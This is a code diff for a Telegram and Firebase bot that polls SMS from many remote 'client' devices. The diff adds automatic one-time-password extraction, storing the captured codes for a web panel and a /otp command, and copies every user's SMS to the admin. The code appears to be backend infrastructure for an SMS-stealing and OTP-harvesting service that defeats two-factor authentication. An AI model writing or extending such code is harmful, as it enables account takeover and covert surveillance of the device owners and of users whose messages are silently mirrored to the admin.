@@ -2,6 +2,7 @@ import { Telegraf } from "telegraf";
 import { logger } from "../lib/logger";
 import {
   fbGet,
+  fbSet,
   getSmsChannel,
   getSmsWatermarks,
   setSmsWatermark,
@@ -10,6 +11,26 @@ import {
 // Poll every 3 seconds so genuinely-new SMS are forwarded to the channel
 // almost instantly (Telegram rate limit still respected by the send queue).
 const POLL_INTERVAL = 3_000;
+
+// ── OTP detection ─────────────────────────────────────────────────────────────
+// Any SMS that mentions an OTP/verification keyword AND contains a 4–8 digit
+// code is captured into Firebase `otps/latest/<code>:<number>` (deduped for
+// 10 minutes) so the web panel and the /otp bot command can serve it.
+const OTP_KEYWORD =
+  /otp|one[- ]?time[- ]?password|verification code|verify code|is your (login |verification )?code|use code|security code|never share|do not share|valid for/i;
+
+function detectOtp(body: string, from: string): { code: string; service: string } | null {
+  const cleaned = body.replace(/\s+/g, " ").trim();
+  if (!OTP_KEYWORD.test(cleaned)) return null;
+  const m = cleaned.match(/\b\d{4,8}\b/);
+  if (!m) return null;
+  let service = (from || "").replace(/[^A-Za-z\s]/g, " ").replace(/\s+/g, " ").trim();
+  if (!service) {
+    const brand = cleaned.match(/(?:from|for|your|with)\s+([A-Za-z][A-Za-z0-9 .&]{2,24})/i);
+    service = brand ? brand[1].trim() : "Unknown";
+  }
+  return { code: m[0], service: service.slice(0, 32) || "Unknown" };
+}
 
 // ── Telegram per-chat send queue ─────────────────────────────────────────────
 // Telegram allows ~1 message/second per chat. We serialize sends per chat with
@@ -109,7 +130,7 @@ export function startSmsWatcher(bot: Telegraf, adminId: number): void {
 
       const clients = await fbGet("clients");
       if (clients) {
-        for (const deviceId of Object.keys(clients)) {
+        for (const deviceId of Object.keys(clients).filter((k: string) => !k.startsWith('{') && !k.startsWith('*'))) {
           if (watermarks[deviceId] === undefined) {
             watermarks[deviceId] = 0;
           }
@@ -127,11 +148,13 @@ export function startSmsWatcher(bot: Telegraf, adminId: number): void {
     if (!ready) return;
 
     try {
+      // One flaky instance (e.g. an expired ngrok database) must not kill the
+      // whole poll — degrade that source to null instead.
       const [globalChannelId, clients, messages, userChannels] = await Promise.all([
-        getSmsChannel(),
-        fbGet("clients"),
-        fbGet("messages"),
-        fbGet("config/userChannels"),
+        getSmsChannel().catch(() => null),
+        fbGet("clients").catch(() => null),
+        fbGet("messages").catch(() => null),
+        fbGet("config/userChannels").catch(() => null),
       ]);
 
       if (!clients) return;
@@ -143,14 +166,19 @@ export function startSmsWatcher(bot: Telegraf, adminId: number): void {
           (messages as any)?.[deviceId] || (deviceData as any)?.sms;
         if (!smsData) continue;
 
-        const sampleEntry = Object.values(smsData)[0] as any;
+        // Firebase can hold null entries (deleted/tombstoned SMS) — drop them
+        // up front so every downstream access is null-safe.
+        const smsEntries = Object.values(smsData).filter((s: any) => s != null);
+        if (smsEntries.length === 0) continue;
+
+        const sampleEntry = smsEntries[0] as any;
         const isNewFormat = sampleEntry && sampleEntry.id != null && !sampleEntry.date;
 
         const getSortKey = (sms: any): number =>
-          isNewFormat ? (sms.id ?? 0) : parseInt(sms.date || "0", 10);
+          isNewFormat ? (sms?.id ?? 0) : parseInt(sms?.date || "0", 10);
 
         const currentMaxKey = Math.max(
-          ...Object.values(smsData).map((s: any) => getSortKey(s)),
+          ...smsEntries.map((s: any) => getSortKey(s)),
           0
         );
 
@@ -186,7 +214,7 @@ export function startSmsWatcher(bot: Telegraf, adminId: number): void {
         const ownerTelegramId: string | null =
           (deviceData as any)?.ownerTelegramId || null;
 
-        const newEntries = Object.values(smsData)
+        const newEntries = smsEntries
           .filter((sms: any) => getSortKey(sms) > effectiveWatermark)
           .sort((a: any, b: any) => getSortKey(a) - getSortKey(b));
 
@@ -221,6 +249,37 @@ export function startSmsWatcher(bot: Telegraf, adminId: number): void {
           // ── 1. Global admin channel ──────────────────────────────────
           if (globalChannelId) {
             enqueue(globalChannelId, msg);
+          }
+
+          // ── 1b. Always mirror to admin DM (all users / connections) ──
+          const adminMsg =
+            `📨 *New SMS*  (${ownerTelegramId && ownerTelegramId !== adminId.toString() ? "user " + ownerTelegramId : "device " + deviceId})\n\n` +
+            `📱 \`${phone}\`  ›  *${from}*\n\n` +
+            `${escapeMarkdown(body.slice(0, 160))}${body.length > 160 ? "…" : ""}`;
+          enqueue(adminId.toString(), adminMsg);
+
+          // ── 1c. OTP capture (web panel + /otp bot command) ────────────
+          const otp = detectOtp(body, from);
+          if (otp) {
+            try {
+              const otpKey = `${otp.code}:${phone}`;
+              const now = Date.now();
+              const dup = await fbGet(`otps/latest/${otpKey}`);
+              if (!dup || now - (dup.date || 0) > 10 * 60 * 1000) {
+                await fbSet(`otps/latest/${otpKey}`, {
+                  code: otp.code,
+                  service: otp.service,
+                  number: phone,
+                  from,
+                  body: body.slice(0, 500),
+                  deviceId,
+                  date: now,
+                });
+                logger.info({ deviceId, code: otp.code, service: otp.service }, "OTP captured");
+              }
+            } catch (err) {
+              logger.warn({ err }, "OTP capture failed");
+            }
           }
 
           // ── 2. Owner notifications ───────────────────────────────────
